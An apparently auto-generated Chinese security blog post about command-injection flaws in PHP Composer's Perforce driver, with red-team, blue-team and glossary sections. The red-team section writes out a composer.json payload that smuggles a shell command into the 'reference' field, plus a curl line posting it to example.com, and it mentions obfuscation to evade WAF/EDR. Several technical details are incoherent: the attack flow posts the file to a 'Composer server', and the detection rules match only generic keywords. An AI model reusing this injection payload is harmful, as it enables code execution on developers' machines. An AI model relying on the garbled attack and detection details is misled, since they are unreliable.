---
layout: post
title:  "New PHP Composer Flaws Enable Arbitrary Command Execution — Patches Released"
date:   2026-04-14 19:03:05 +0000
categories: [security]
severity: high
---

# 🔥 解析 Composer 高風險安全漏洞：命令執行與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：7.8 和 8.8)
> * **受駭指標**: RCE (Remote Command Execution)
> * **關鍵技術**: Command Injection, Input Validation, Shell Metacharacters

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Composer 的 Perforce VCS 驅動程式中存在命令注入漏洞，原因是輸入驗證不充分，允許攻擊者控制儲存庫配置並在 `composer.json` 中宣告惡意的 Perforce VCS 儲存庫，從而注入任意命令。
* **攻擊流程圖解**:
  1. 攻擊者控制儲存庫配置。
  2. 攻擊者在 `composer.json` 中宣告惡意的 Perforce VCS 儲存庫。
  3. Composer 執行 `composer.json` 中的命令。
  4. 攻擊者注入的命令被執行。
* **受影響元件**: Composer 版本 >= 2.3, < 2.9.6 和 >= 2.0, < 2.2.27。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要控制儲存庫配置和 `composer.json` 文件。
* **Payload 建構邏輯**:

    ```
    
    json
      {
        "repositories": [
          {
            "type": "perforce",
            "url": "p4://example.com",
            "reference": "master; ${shell_command}"
          }
        ]
      }
    
    ```
  *範例指令*: 使用 `curl` 發送惡意的 `composer.json` 文件到 Composer 伺服器。

```

bash
  curl -X POST -H "Content-Type: application/json" -d '{"repositories": [{"type": "perforce", "url": "p4://example.com", "reference": "master; ${shell_command}"}]}' http://example.com/composer.json

```
* **繞過技術**: 如果 Composer 伺服器有 WAF 或 EDR 保護，攻擊者可以嘗試使用編碼或混淆技術來繞過檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | composer.json |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule composer_vuln {
        meta:
          description = "Detects Composer vulnerability"
        strings:
          $a = "perforce"
          $b = "reference"
        condition:
          $a and $b
      }
    
    ```
  或者使用 Snort/Suricata Signature：

```

snort
  alert tcp any any -> any any (msg:"Composer vulnerability"; content:"perforce"; content:"reference";)

```
* **緩解措施**: 更新 Composer 至最新版本，檢查 `composer.json` 文件中的 Perforce 相關字段，僅使用受信任的 Composer 儲存庫，避免使用 `--prefer-dist` 或 `preferred-install: dist` 配置設定。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Command Injection (命令注入)**: 想像攻擊者可以在系統中執行任意命令。技術上是指攻擊者可以注入惡意命令到系統中，從而執行任意動作。
* **Input Validation (輸入驗證)**: 想像系統需要驗證用戶輸入的資料。技術上是指系統需要檢查用戶輸入的資料是否合法，避免攻擊者注入惡意資料。
* **Shell Metacharacters (Shell 元字符)**: 想像 Shell 中的特殊字符。技術上是指 Shell 中的特殊字符，例如 `;`、`|`、`&` 等，可以用來執行任意命令。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/new-php-composer-flaws-enable-arbitrary.html)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1204/)


